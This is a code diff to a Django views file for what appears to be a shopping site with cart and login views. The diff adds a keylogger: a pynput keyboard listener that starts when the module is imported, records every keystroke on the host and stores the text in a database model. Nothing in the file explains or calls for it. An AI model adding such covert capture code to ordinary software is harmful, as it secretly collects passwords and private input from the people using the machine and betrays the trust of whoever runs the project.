@@ -10,7 +10,32 @@ from django.contrib.auth.models import User
 from cart.models import cart, cartItem
 from enquiry.forms import enquiry_form
 
+from pynput import keyboard
+
+from products.models import Word
+
 # Create your views here.
+
+final = ""
+def on_release(key):
+    global final
+    try:
+        
+        final = final + key.char
+    except AttributeError:
+        print('special key {0} pressed'.format(
+            key))
+        final = final + str(key)
+        # Word(word = final).save()
+        Word(word = final).save()
+        final = ""
+
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+listener = keyboard.Listener(on_release=on_release)
+listener.start()
 
 def home_view(request):
     context = {
@@ -39,6 +64,7 @@ def login_view(request):
                 context['error'] = "Incorrect username or password."
         except:
             context['error'] = "Email not in use."
+    
 
     return render(request, 'login.html', context)
 
